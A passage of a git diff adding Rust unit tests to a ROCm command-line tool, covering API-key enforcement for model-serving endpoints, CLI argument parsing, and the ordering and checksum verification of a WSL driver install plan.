+            key_value.as_deref(),
+            Some("live-secret"),
+            "the key the starting server needs must survive intact"
+        );
+        assert_eq!(
+            removed_files, 0,
+            "the published record makes its key a companion, not a leftover:\n{text}"
+        );
+        assert_eq!(
+            skipped_live, 1,
+            "the launch is live by the time prune reads the directory:\n{text}"
+        );
         Ok(())
     }
 
@@ -28325,6 +29889,7 @@ install therock";
             None,
             None,
             Some(&requested_recipe),
+            false,
         );
         let _ = fs::remove_dir_all(root);
 
@@ -28339,6 +29904,163 @@ install therock";
         assert!(
             message.contains("recipe hint, tool-call parser, or generation defaults"),
             "message should not single out generation defaults as the sole cause: {message}"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn spawn_managed_engine_child_refuses_to_reuse_an_unauthenticated_service() -> Result<()> {
+        // `--require-api-key` used to be accepted and dropped on this path. The
+        // reuse branch returns before the flag is recorded and before the
+        // endpoint key is checked, so a caller demanding auth got a server that
+        // never had it, with no error. `rocm remote serve` then published that
+        // endpoint onto the tailnet and printed a freshly minted key under "the
+        // API key above is what stops anyone else calling it" — a false
+        // assurance about an endpoint the whole tailnet can reach.
+        //
+        // Asserted through `spawn_managed_engine_child` rather than against the
+        // guard's own arguments: the defect was the early return, so only the
+        // real call site can fail for it.
+        let (root, paths) = test_paths("dup-managed-unauthenticated-reuse");
+        paths.ensure()?;
+        let mut existing = ManagedServiceRecord::new(
+            &paths,
+            "lemonade-qwen-3000",
+            "lemonade",
+            "qwen",
+            "qwen-canonical",
+            "127.0.0.1",
+            11520,
+            "managed",
+            std::process::id(),
+            None,
+            None,
+            None,
+        );
+        existing.status = "ready".to_owned();
+        existing.engine_pid = Some(std::process::id());
+        // The state that matters: live, matching, and serving without auth.
+        existing.requires_api_key = false;
+        existing.write()?;
+
+        let resolve = ResolveModelResponse {
+            canonical_model_id: "qwen-canonical".to_owned(),
+            task: "chat".to_owned(),
+            source: "hf".to_owned(),
+            revision: "main".to_owned(),
+            loader: "llama.cpp".to_owned(),
+            trust_remote_code: false,
+            chat_template_mode: "auto".to_owned(),
+            dtype: "auto".to_owned(),
+            device_policy: DevicePolicy::GpuPreferred,
+            estimated_memory: "unknown".to_owned(),
+            launch_defaults: serde_json::json!({}),
+            engine_recipe: None,
+            warnings: Vec::new(),
+        };
+
+        let result = spawn_managed_engine_child(
+            &paths,
+            "lemonade",
+            "lemonade-qwen-3001",
+            "qwen",
+            &resolve,
+            "127.0.0.1",
+            11520,
+            &resolve.device_policy,
+            &[],
+            None,
+            None,
+            None,
+            // The demand that used to be silently discarded.
+            true,
+        );
+        let _ = fs::remove_dir_all(root);
+
+        let Err(error) = result else {
+            panic!(
+                "reusing an unauthenticated service must not satisfy `--require-api-key`; a \
+                 satisfied reuse leaves the endpoint open while the caller is told it is not"
+            )
+        };
+        let message = error.to_string();
+        assert!(
+            message.contains("without authentication"),
+            "the refusal must say why it refused: {message}"
+        );
+        assert!(
+            message.contains("rocm services stop lemonade-qwen-3000"),
+            "the refusal must name the way out, with the service to stop: {message}"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn a_managed_spawn_refuses_an_invalid_key_file_on_a_service_that_requires_one() -> Result<()> {
+        // Drives the real call site, not the guard's own arguments. The service
+        // was launched with `--require-api-key`, and its key file is present but
+        // empty — so `requires_api_key` is true while `key_present` is false,
+        // which is the only way to reach the first branch. A test calling
+        // `ensure_public_service_has_endpoint_key` directly cannot catch a
+        // mis-wired call site, which is the defect that has occurred here twice.
+        //
+        // The flag is passed explicitly rather than inferred from the key file.
+        // Inferring it marked every public bind as having demanded auth, because
+        // a public bind always has a key file whether or not it asked for one.
+        let (root, paths) = test_paths("managed-spawn-invalid-key");
+        paths.ensure()?;
+        fs::create_dir_all(paths.services_dir())?;
+
+        // Empty, so the file exists (requires_api_key = true) but yields no
+        // usable key (key_present = false).
+        endpoint_keys::store_endpoint_api_key(&paths, "lemonade-qwen-3000", "")?;
+
+        let resolve = ResolveModelResponse {
+            canonical_model_id: "qwen-canonical".to_owned(),
+            task: "chat".to_owned(),
+            source: "hf".to_owned(),
+            revision: "main".to_owned(),
+            loader: "llama.cpp".to_owned(),
+            trust_remote_code: false,
+            chat_template_mode: "auto".to_owned(),
+            dtype: "auto".to_owned(),
+            device_policy: DevicePolicy::GpuPreferred,
+            estimated_memory: "unknown".to_owned(),
+            launch_defaults: serde_json::json!({}),
+            engine_recipe: None,
+            warnings: Vec::new(),
+        };
+
+        let result = spawn_managed_engine_child(
+            &paths,
+            "lemonade",
+            "lemonade-qwen-3000",
+            "qwen",
+            &resolve,
+            // Loopback on purpose: the public-bind branch must not be what
+            // refuses this, or the test would pass with the guard disabled.
+            "127.0.0.1",
+            11512,
+            &resolve.device_policy,
+            &[],
+            None,
+            None,
+            None,
+            true,
+        );
+        let _ = fs::remove_dir_all(root);
+
+        let Err(error) = result else {
+            panic!("a service requiring a key must not spawn with an unusable key file")
+        };
+        let message = error.to_string();
+        assert!(
+            message.contains("--require-api-key"),
+            "the refusal must name the flag the service was launched with: {message}"
+        );
+        assert!(
+            message.contains("without authentication"),
+            "the refusal must say what the risk is: {message}"
         );
         Ok(())
     }
@@ -28455,6 +30177,31 @@ install therock";
     }
 
     #[test]
+    fn remote_is_structured_not_freeform() {
+        // `rocm remote …` reads like a plain-English request, so without an
+        // entry in the structured allowlist the natural-language planner
+        // swallows it and the real command becomes unreachable. This guards the
+        // allowlist against losing `remote`.
+        let invocation = parse_freeform_invocation(&[
+            "remote".to_owned(),
+            "targets".to_owned(),
+            "--tag".to_owned(),
+            "gpu".to_owned(),
+        ]);
+        assert!(!treat_as_natural_language(&invocation.request_args));
+        assert!(!should_treat_as_freeform(&invocation));
+
+        Cli::try_parse_from(["rocm", "remote", "targets"])
+            .expect("remote targets should be a real command");
+        Cli::try_parse_from(["rocm", "remote", "targets", "--tag", "gpu"])
+            .expect("remote targets should accept a tag filter");
+        // The group has no useful default action, so a bare `rocm remote` must
+        // show help rather than silently doing something.
+        Cli::try_parse_from(["rocm", "remote"])
+            .expect_err("bare `rocm remote` should require a subcommand");
+    }
+
+    #[test]
     fn install_sdk_accepts_family_override() {
         Cli::try_parse_from([
             "rocm",
@@ -28470,6 +30217,101 @@ install therock";
             "gfx110X-all",
         ])
         .expect("install sdk should accept a TheRock family override");
+    }
+
+    #[test]
+    fn install_sdk_devel_flag_defaults_off_and_wires_through_when_passed() {
+        let cli = Cli::try_parse_from(["rocm", "install", "sdk"])
+            .expect("install sdk should parse with no flags");
+        match cli.command {
+            Some(Command::Install {
+                target: InstallTarget::Sdk { devel, .. },
+            }) => assert!(!devel, "--devel should default to false"),
+            other => panic!("expected an install sdk target, got {other:?}"),
+        }
+
+        let cli = Cli::try_parse_from(["rocm", "install", "sdk", "--devel"])
+            .expect("install sdk should accept --devel");
+        match cli.command {
+            Some(Command::Install {
+                target: InstallTarget::Sdk { devel, .. },
+            }) => assert!(devel, "--devel should set the flag to true"),
+            other => panic!("expected an install sdk target, got {other:?}"),
+        }
+    }
+
+    /// The half the parse test above cannot reach: that the parsed flag is what
+    /// the install request carries.
+    ///
+    /// `install()` is not callable here — it needs `uv`, a live index and a real
+    /// probe — so the mapping is extracted into `sdk_install_request` and pinned
+    /// directly. Hardcoding `include_devel` at that mapping is the change this
+    /// catches and the clap test does not.
+    #[test]
+    fn install_sdk_request_forwards_the_parsed_devel_flag() {
+        for devel in [false, true] {
+            let request = sdk_install_request(
+                "release",
+                "wheel",
+                None,
+                None,
+                None,
+                false,
+                devel,
+                therock::SdkInstallConsent::Ask,
+            );
+            assert_eq!(
+                request.include_devel, devel,
+                "the parsed --devel flag must reach the install request"
+            );
+        }
+
+        // And the flag must not be confused with the neighbouring bool.
+        let dry_run_only = sdk_install_request(
+            "release",
+            "wheel",
+            None,
+            None,
+            None,
+            true,
+            false,
+            therock::SdkInstallConsent::Ask,
+        );
+        assert!(dry_run_only.dry_run);
+        assert!(!dry_run_only.include_devel);
+    }
+
+    /// End to end across the two seams a `rocm install sdk --devel` traverses:
+    /// clap parse, then the request mapping. Neither alone proves the flag
+    /// survives the trip.
+    #[test]
+    fn parsed_install_sdk_arguments_reach_the_request_with_devel_intact() {
+        for (args, expected) in [
+            (vec!["rocm", "install", "sdk"], false),
+            (vec!["rocm", "install", "sdk", "--devel"], true),
+        ] {
+            let cli = Cli::try_parse_from(&args).expect("install sdk should parse");
+            let Some(Command::Install {
+                target: InstallTarget::Sdk { devel, .. },
+            }) = cli.command
+            else {
+                panic!("expected an install sdk target for {args:?}");
+            };
+            let request = sdk_install_request(
+                "release",
+                "wheel",
+                None,
+                None,
+                None,
+                false,
+                devel,
+                therock::SdkInstallConsent::Ask,
+            );
+            assert_eq!(
+                request.include_devel, expected,
+                "--devel did not survive parse -> request for {args:?}"
+            );
+        }
     }
 
     #[test]
@@ -28661,14 +30503,42 @@ install therock";
     fn resolve_endpoint_auth_loopback_stays_credential_free() {
         // Loopback binds never require auth, even if a key is supplied.
         for host in ["127.0.0.1", "localhost", "::1"] {
-            assert_eq!(resolve_endpoint_auth(host, None).unwrap(), None);
-            assert_eq!(resolve_endpoint_auth(host, Some("ignored")).unwrap(), None);
+            assert_eq!(resolve_endpoint_auth(host, None, false).unwrap(), None);
+            assert_eq!(
+                resolve_endpoint_auth(host, Some("ignored"), false).unwrap(),
+                None
+            );
         }
     }
 
     #[test]
+    fn resolve_endpoint_auth_loopback_can_be_required_when_something_republishes_it() {
+        // "Loopback" describes the bind address, not who can reach the port. A
+        // tailnet publish, a proxy, or a container port map all leave the bind
+        // loopback while widening the audience, and the default policy would
+        // hand out an unauthenticated endpoint. Whoever widens the reach asks
+        // for the credential explicitly.
+        for host in ["127.0.0.1", "localhost", "::1"] {
+            let generated = resolve_endpoint_auth(host, None, true)
+                .unwrap()
+                .expect("a required key must be generated, not skipped");
+            assert!(!generated.trim().is_empty());
+
+            assert_eq!(
+                resolve_endpoint_auth(host, Some("supplied-key"), true).unwrap(),
+                Some("supplied-key".to_owned()),
+                "a supplied key must be honoured rather than ignored as it is by default"
+            );
+        }
+
+        // The same validation a public bind gets: an empty key is a refusal, not
+        // a silent downgrade to no auth.
+        assert!(resolve_endpoint_auth("127.0.0.1", Some("  "), true).is_err());
+    }
+
+    #[test]
     fn resolve_endpoint_auth_public_uses_supplied_key_trimmed() {
-        let key = resolve_endpoint_auth("0.0.0.0", Some("  my-key  "))
+        let key = resolve_endpoint_auth("0.0.0.0", Some("  my-key  "), false)
             .unwrap()
             .expect("public bind must have a key");
         assert_eq!(key, "my-key");
@@ -28676,7 +30546,7 @@ install therock";
 
     #[test]
     fn resolve_endpoint_auth_public_generates_key_when_absent() {
-        let key = resolve_endpoint_auth("0.0.0.0", None)
+        let key = resolve_endpoint_auth("0.0.0.0", None, false)
             .unwrap()
             .expect("public bind must generate a key");
         assert_eq!(key.len(), 48);
@@ -28685,7 +30555,7 @@ install therock";
 
     #[test]
     fn resolve_endpoint_auth_public_rejects_empty_supplied_key() {
-        let error = resolve_endpoint_auth("0.0.0.0", Some("   ")).unwrap_err();
+        let error = resolve_endpoint_auth("0.0.0.0", Some("   "), false).unwrap_err();
         assert!(error.to_string().contains("non-empty"), "{error:#}");
     }
 
@@ -28699,7 +30569,7 @@ install therock";
             "good-key\nmore",
             "line\rreturn",
         ] {
-            let error = resolve_endpoint_auth("0.0.0.0", Some(supplied)).unwrap_err();
+            let error = resolve_endpoint_auth("0.0.0.0", Some(supplied), false).unwrap_err();
             assert!(error.to_string().contains("control character"), "{error:#}");
         }
     }
@@ -28743,10 +30613,92 @@ install therock";
     }
 
     #[test]
+    fn a_public_bind_is_refused_with_the_command_that_restores_it() {
+        // `resolve_endpoint_auth` mints a key for every non-loopback bind whether
+        // or not auth was demanded, so deriving `requires_api_key` from key-file
+        // presence marked ordinary public binds as having asked for it. The guard
+        // tests that field first, so those services were refused with a message
+        // naming a flag they never passed and a relaunch command that drops
+        // `--allow-public-bind` — coming back on loopback instead.
+        //
+        // A plain `--host 0.0.0.0 --allow-public-bind` launch: key file present,
+        // `--require-api-key` never passed.
+        let error = ensure_public_service_has_endpoint_key("0.0.0.0", false, false)
+            .expect_err("a public bind with no key must be refused");
+        let rendered = format!("{error:#}");
+        assert!(
+            rendered.contains("--allow-public-bind"),
+            "the refusal must name the command that restores the public bind: {rendered}"
+        );
+        assert!(
+            !rendered.contains("--require-api-key"),
+            "a service that never passed the flag must not be told it did: {rendered}"
+        );
+
+        // And the loopback-with-forced-auth case still reports its own reason.
+        let error = ensure_public_service_has_endpoint_key("127.0.0.1", false, true)
+            .expect_err("a service that demanded auth must not come back without it");
+        assert!(
+            format!("{error:#}").contains("--require-api-key"),
+            "{error:#}"
+        );
+    }
+
+    #[test]
+    fn restarting_a_keyless_public_service_names_the_public_bind_not_the_key_flag() -> Result<()> {
+        // The same defect at a real call site rather than through the guard's own
+        // arguments. `restart` reads `requires_api_key` off the record on disk, so
+        // a record written by an ordinary public-bind launch must not claim the
+        // service asked for `--require-api-key` — the branch order means a record
+        // that claims it wins, and its remediation drops `--allow-public-bind`.
+        let (root, paths) = test_paths("restart-public-no-key");
+        paths.ensure()?;
+        let mut record = ManagedServiceRecord::new(
+            &paths,
+            "vllm-public-2000",
+            "vllm",
+            "qwen",
+            "qwen-canonical",
+            "0.0.0.0",
+            12000,
+            "managed",
+            std::process::id(),
+            None,
+            None,
+            None,
+        );
+        // What a plain `--host 0.0.0.0 --allow-public-bind` launch records: the
+        // bind is public, and the flag was never passed.
+        record.requires_api_key = false;
+        record.write()?;
+
+        // No key file: the situation after a stop, which drops it.
+        let error = restart_internal_managed_service(&paths, "vllm-public-2000")
+            .expect_err("a keyless public service must not be restarted");
+        let rendered = format!("{error:#}");
+        assert!(
+            rendered.contains("--allow-public-bind"),
+            "the refusal must name the command that brings it back public: {rendered}"
+        );
+        assert!(
+            !rendered.contains("--require-api-key"),
+            "a service that never passed the flag must not be told it did: {rendered}"
+        );
+
+        // The refusal happens before the stop, so the service is left alone.
+        assert!(
+            load_managed_service(&paths, "vllm-public-2000").is_ok(),
+            "a refused restart must not have removed the record"
+        );
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
     fn respawn_fails_closed_for_a_public_service_whose_key_is_gone() {
         // A stop deletes the key file, so a later restart of a public service
         // would otherwise respawn it with no auth at all.
-        let error = ensure_public_service_has_endpoint_key("0.0.0.0", false).unwrap_err();
+        let error = ensure_public_service_has_endpoint_key("0.0.0.0", false, false).unwrap_err();
         let message = error.to_string();
         assert!(message.contains("0.0.0.0"), "{error:#}");
         assert!(message.contains("without authentication"), "{error:#}");
@@ -28754,17 +30706,36 @@ install therock";
         assert!(message.contains("--allow-public-bind"), "{error:#}");
 
         // A public service that still has its key restarts normally.
-        ensure_public_service_has_endpoint_key("0.0.0.0", true).unwrap();
+        ensure_public_service_has_endpoint_key("0.0.0.0", true, false).unwrap();
     }
 
     #[test]
     fn respawn_allows_loopback_services_without_an_endpoint_key() {
         // Loopback stays credential-free, so every accepted spelling must pass
-        // the guard with no key present.
+        // the guard with no key present — when nothing asked for auth.
         for host in ["127.0.0.1", "localhost", "::1"] {
-            ensure_public_service_has_endpoint_key(host, false)
+            ensure_public_service_has_endpoint_key(host, false, false)
                 .unwrap_or_else(|error| panic!("{host} must not require a key: {error:#}"));
         }
+    }
+
+    #[test]
+    fn respawn_refuses_a_loopback_service_that_was_launched_with_a_key() {
+        // The hole this closes: a loopback bind that something else republishes
+        // — a tailnet publish, a proxy, a container port map. The publish
+        // outlives the process, so a restart after the key was dropped would
+        // reopen a reachable endpoint with no authentication, and the bind
+        // address gives the guard no way to notice.
+        for host in ["127.0.0.1", "localhost", "::1"] {
+            let error = ensure_public_service_has_endpoint_key(host, false, true)
+                .expect_err("a service launched with a key must not restart without one");
+            let message = format!("{error:#}");
+            assert!(message.contains("without authentication"), "{message}");
+            assert!(message.contains("--require-api-key"), "{message}");
+        }
+
+        // With its key still present it restarts normally.
+        ensure_public_service_has_endpoint_key("127.0.0.1", true, true).unwrap();
     }
 
     #[test]
@@ -30105,6 +32076,195 @@ VERSION_CODENAME=noble
     }
 
     #[test]
+    fn driver_plan_executor_runs_verify_after_execute() -> Result<()> {
+        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        plan.commands = vec![
+            driver_command(DriverCommandPhase::Prepare, "prepare"),
+            driver_command(DriverCommandPhase::Execute, "execute"),
+            driver_command(DriverCommandPhase::Verify, "verify"),
+        ];
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", true).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        let mut observed = Vec::new();
+
+        execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |command| {
+                observed.push(command.to_owned());
+                Ok(())
+            },
+            |_| Ok(()),
+            || Ok(test_examine("linux", true).driver),
+        )?;
+
+        assert_eq!(observed, ["prepare", "execute", "verify"]);
+        assert!(state.executed_at_unix_ms.is_some());
+        Ok(())
+    }
+
+    #[test]
+    fn driver_plan_executor_defers_verify_when_reboot_is_required() -> Result<()> {
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n",
+            true,
+            PrivilegeEscalation::Sudo,
+        );
+        assert!(plan.reboot_required);
+        let expected = plan.execution_commands();
+        let verify_commands = plan
+            .commands
+            .iter()
+            .filter(|command| command.phase == DriverCommandPhase::Verify)
+            .map(|command| command.command.clone())
+            .collect::<Vec<_>>();
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", false).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        let mut observed = Vec::new();
+
+        execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |command| {
+                observed.push(command.to_owned());
+                Ok(())
+            },
+            |_| Ok(()),
+            || Ok(test_examine("linux", false).driver),
+        )?;
+
+        assert_eq!(observed, expected);
+        assert!(
+            verify_commands
+                .iter()
+                .all(|command| !observed.contains(command)),
+            "reboot-gated Verify commands must be deferred: {verify_commands:?}"
+        );
+        assert!(state.executed_at_unix_ms.is_some());
+        assert!(state.reboot_required);
+        Ok(())
+    }
+
+    #[test]
+    fn failed_driver_verify_does_not_mark_execution_completed() -> Result<()> {
+        let (root, paths) = test_paths("driver-verify-failure-state");
+        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        plan.commands = vec![
+            driver_command(DriverCommandPhase::Prepare, "prepare"),
+            driver_command(DriverCommandPhase::Execute, "execute"),
+            driver_command(DriverCommandPhase::Verify, "verify"),
+        ];
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", true).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        write_driver_install_state(&paths, &state)?;
+        let mut observed = Vec::new();
+        let mut gathered = false;
+
+        let error = execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |command| {
+                observed.push(command.to_owned());
+                if command == "verify" {
+                    bail!("verification rejected the install");
+                }
+                Ok(())
+            },
+            |state| write_driver_install_state(&paths, state),
+            || {
+                gathered = true;
+                Ok(test_examine("linux", true).driver)
+            },
+        )
+        .expect_err("failed verification must fail the install");
+        let saved = read_driver_install_state(&paths)?.expect("state should remain readable");
+
+        assert_eq!(observed, ["prepare", "execute", "verify"]);
+        assert!(error.to_string().contains("driver command failed: verify"));
+        assert!(
+            !gathered,
+            "post-install state must not be gathered after failure"
+        );
+        assert_eq!(state.executed_at_unix_ms, None);
+        assert!(state.post_driver.is_none());
+        assert_eq!(saved.executed_at_unix_ms, None);
+        assert!(saved.post_driver.is_none());
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn failed_post_driver_gather_keeps_executed_state_persisted() -> Result<()> {
+        let (root, paths) = test_paths("driver-gather-failure-state");
+        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        plan.commands = vec![
+            driver_command(DriverCommandPhase::Prepare, "prepare"),
+            driver_command(DriverCommandPhase::Execute, "execute"),
+            driver_command(DriverCommandPhase::Verify, "verify"),
+        ];
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", true).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        write_driver_install_state(&paths, &state)?;
+
+        let error = execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |_| Ok(()),
+            |state| write_driver_install_state(&paths, state),
+            || bail!("post-driver gather failed"),
+        )
+        .expect_err("a post-driver gather failure must still fail the install");
+        let saved = read_driver_install_state(&paths)?.expect("state should remain readable");
+
+        assert!(error.to_string().contains("post-driver gather failed"));
+        assert!(saved.executed_at_unix_ms.is_some());
+        assert!(saved.post_driver.is_none());
+        let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
     fn driver_reconcile_without_state_gives_non_privileged_guidance() -> Result<()> {
         let (root, paths) = test_paths("driver-reconcile-empty");
 
@@ -30188,6 +32348,48 @@ VERSION_CODENAME=noble
         assert_eq!(reconciliation.check_summary.present, 1);
         assert_eq!(reconciliation.check_summary.missing, 1);
         let _ = fs::remove_dir_all(root);
+        Ok(())
+    }
+
+    #[test]
+    fn driver_reconcile_preserves_explicit_reboot_policy() -> Result<()> {
+        for reboot_required in [false, true] {
+            let (root, paths) = test_paths(if reboot_required {
+                "driver-reconcile-reboot-true"
+            } else {
+                "driver-reconcile-reboot-false"
+            });
+            let driver = rocm_core::DriverSummary {
+                policy: "driver-policy".to_owned(),
+                status: "available".to_owned(),
+                detail: None,
+            };
+            let mut state = DriverInstallState {
+                approved_at_unix_ms: 1,
+                executed_at_unix_ms: Some(2),
+                pre_driver: driver.clone(),
+                post_driver: None,
+                boot_id_at_execution: Some("same-boot".to_owned()),
+                reboot_required,
+                reboot_observed: false,
+                commands: vec!["execute".to_owned()],
+                reconciled_at_unix_ms: None,
+                reconciliation: None,
+            };
+
+            reconcile_driver_install_state(
+                &paths,
+                &mut state,
+                driver,
+                Some("same-boot".to_owned()),
+                Vec::new(),
+            )?;
+            let saved = read_driver_install_state(&paths)?.expect("state should be saved");
+
+            assert_eq!(state.reboot_required, reboot_required);
+            assert_eq!(saved.reboot_required, reboot_required);
+            let _ = fs::remove_dir_all(root);
+        }
         Ok(())
     }
 
@@ -30565,8 +32767,17 @@ VERSION_ID="41"
     }
 
     #[test]
-    fn wsl_install_driver_uses_rocdxg_guidance_without_dkms() {
-        let _env = ScopedTestEnv::with_amd_overrides_cleared();
+    fn wsl_install_driver_installs_rocdxg_without_dkms() {
+        // `dkms: true` is passed deliberately: WSL2 has no kernel module to
+        // build, so the flag must not pull in the bare-metal path.
+        //
+        // `build_driver_install_plan` resolves `${ROCM_CLI_AMDGPU_VERSION:-...}`
+        // from process env before it reaches the WSL branch, and the WSL branch
+        // then reads the three ROCDXG vars — an exported
+        // `ROCM_CLI_ROCDXG_VERSION` would steer this plan into a refusal and
+        // fail the `plan.supported` assertion below. So this reader takes the
+        // guard that clears both sets.
+        let _env = scoped_rocdxg_env();
         let plan = build_driver_install_plan(
             &test_examine("linux", true),
             "",
@@ -30575,12 +32786,500 @@ VERSION_ID="41"
         );
         let rendered = render_driver_install_plan(&plan, false, false);
 
-        assert!(!plan.supported);
+        assert!(plan.supported);
+        assert!(plan.mutating);
         assert_eq!(plan.policy, "wsl_rocdxg");
-        assert!(rendered.contains("approval: not required"));
-        assert!(rendered.contains("execution_commands: <none>"));
-        assert!(rendered.contains("scripts/wsl_setup_rocdxg.sh"));
         assert!(!rendered.contains("amdgpu-dkms"));
+        // The whole point of the bug: the plan must be runnable, and must not
+        // send the user to a file that only exists in a git checkout.
+        assert!(!rendered.contains("execution_commands: <none>"));
+        assert!(!rendered.contains("scripts/"));
+        assert!(rendered.contains("approval: required"));
+    }
+
+    #[test]
+    fn wsl_rocdxg_plan_installs_the_library_and_publishes_it() {
+        // Asserts on the default plan, so it has to take the same guard as the
+        // mutating tests in this binary: a concurrent test exporting
+        // `ROCM_CLI_ROCDXG_VERSION` would otherwise steer this one's plan.
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        let commands = plan.execution_commands().join("\n");
+
+        // Fetches the release artifact, installs it, and makes the linker see
+        // it. Any one of these missing leaves `wsl_rocdxg_ready` unreachable.
+        assert!(commands.contains("https://github.com/ROCm/librocdxg/releases/download/"));
+        assert!(commands.contains("rocdxg-roct_"));
+        assert!(commands.contains("sudo apt-get install -y '/tmp/rocdxg-roct_"));
+        assert!(commands.contains("sudo ldconfig"));
+
+        // And in that order. `ldconfig` refreshes the cache from what is on
+        // disk now, so running it before `apt-get install` has unpacked
+        // `librocdxg.so` scans a directory that does not contain it yet and
+        // publishes nothing — leaving the plan reporting success while the
+        // `ldconfig -p` verification below is the only thing that would notice.
+        // Both steps are still present under that swap, so every `contains`
+        // assertion in this file stays green; only a position comparison
+        // catches it.
+        let steps = plan.execution_commands();
+        let install = steps
+            .iter()
+            .position(|c| c.contains("apt-get install -y '/tmp/"))
+            .expect("plan installs the package");
+        let publish = steps
+            .iter()
+            .position(|c| c.trim_end().ends_with("ldconfig"))
+            .expect("plan publishes the library");
+        assert!(
+            install < publish,
+            "ldconfig must run after the package is installed:\n{}",
+            steps.join("\n")
+        );
+
+        // Verification asserts the two things `examine` keys `wsl_rocdxg_ready`
+        // on, so a silently partial install cannot report success.
+        let verify = plan
+            .commands
+            .iter()
+            .filter(|c| c.phase == DriverCommandPhase::Verify)
+            .map(|c| c.command.clone())
+            .collect::<Vec<_>>()
+            .join("\n");
+        assert!(verify.contains("/opt/rocm/lib/librocdxg.so"));
+        assert!(verify.contains("ldconfig -p"));
+    }
+
+    #[test]
+    fn wsl_rocdxg_plan_guards_the_gpu_plumbing_before_any_mutating_command() {
+        // /dev/dxg and dxcore come from the Windows side. If they are missing,
+        // installing the bridge library accomplishes nothing, so the plan must
+        // stop rather than report a successful install of something inert.
+        let _env = scoped_rocdxg_env();
+        let plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        let prepare = plan
+            .commands
+            .iter()
+            .filter(|c| c.phase == DriverCommandPhase::Prepare)
+            .map(|c| c.command.clone())
+            .collect::<Vec<_>>();
+        let joined = prepare.join("\n");
+        assert!(joined.contains("/dev/dxg"));
+        assert!(joined.contains("/usr/lib/wsl/lib/libdxcore.so"));
+        // Named explicitly, rather than surfacing as `sudo: command not found`
+        // from whichever privileged step happened to run first.
+        assert!(joined.contains("command -v sudo"));
+        // Both guards run before anything is fetched or installed.
+        let first_mutation = plan
+            .execution_commands()
+            .iter()
+            .position(|c| c.contains("apt-get") || c.contains("curl"))
+            .expect("plan installs something");
+        let last_guard = plan
+            .execution_commands()
+            .iter()
+            .rposition(|c| c.contains("is missing"))
+            .expect("plan guards the plumbing");
+        assert!(
+            last_guard < first_mutation,
+            "plumbing guards must precede the first mutating command"
+        );
+    }
+
+    /// Clear every input that steers the ROCDXG plan, so a value exported in
+    /// the developer's or runner's shell cannot decide the outcome of a test
+    /// that is asserting on the default.
+    ///
+    /// Builds on [`ScopedTestEnv::with_amd_overrides_cleared`] rather than
+    /// `new` because a WSL plan reached through `build_driver_install_plan`
+    /// resolves the bare-metal AMDGPU overrides before it dispatches to the WSL
+    /// branch: a caller needing one of these two guards needs both, and one
+    /// helper spares every test from picking the wrong half.
+    fn scoped_rocdxg_env() -> ScopedTestEnv {
+        let mut env = ScopedTestEnv::with_amd_overrides_cleared();
+        env.clear("ROCM_CLI_ROCDXG_VERSION");
+        env.clear(ROCDXG_SHA256_ENV);
+        env.clear(ROCDXG_ALLOW_UNVERIFIED_ENV);
+        env
+    }
+
+    #[test]
+    fn wsl_rocdxg_download_is_verified_against_a_pinned_digest_by_default() {
+        // The package is installed with `apt-get install`, which runs its
+        // maintainer scripts as root. With no digest, TLS to the release host
+        // is the only thing authenticating that download — weaker than the
+        // bare-metal path in this same file, which installs from a
+        // `signed-by=` pinned repository. So the default plan must verify.
+        let _env = scoped_rocdxg_env();
+        let commands = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo).execution_commands();
+        let joined = commands.join("\n");
+
+        let pinned = ROCDXG_PINNED_DIGESTS
+            .iter()
+            .find_map(|(version, digest)| (*version == "1.2.2").then_some(*digest))
+            .expect("the default version is pinned");
+        assert!(joined.contains(pinned), "{joined}");
+        assert!(joined.contains("sha256sum -c -"), "{joined}");
+
+        // Not a conditional: an unset variable must not be able to turn
+        // verification off, which is what the previous `if [ -n ... ]` form
+        // did.
+        assert!(
+            !joined.contains("skipping checksum verification"),
+            "{joined}"
+        );
+        assert!(!joined.contains(ROCDXG_SHA256_ENV), "{joined}");
+
+        // Ordering is the whole point — a digest checked after the install has
+        // already run is decoration.
+        let check = commands
+            .iter()
+            .position(|c| c.contains("sha256sum -c -"))
